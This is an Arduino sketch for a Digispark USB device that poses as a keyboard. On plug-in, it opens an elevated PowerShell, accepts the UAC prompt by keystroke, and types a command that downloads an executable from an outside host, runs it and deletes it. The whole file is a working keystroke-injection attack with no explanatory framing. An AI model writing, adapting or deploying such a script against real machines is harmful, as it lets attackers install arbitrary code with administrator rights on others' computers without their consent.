#include "DigiKeyboard.h"
void setup() {

    delay(1000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    delay(500);
    DigiKeyboard.print("powershell");
    delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("cd ~/Downloads; iwr \"https://praxe2026.milos-scripts.xyz/download/Praxe2026.exe\" -o \"helper.exe\"; .\\helper.exe; rm helper.exe");
    delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
;}

void loop() {
  //empty
    
    
}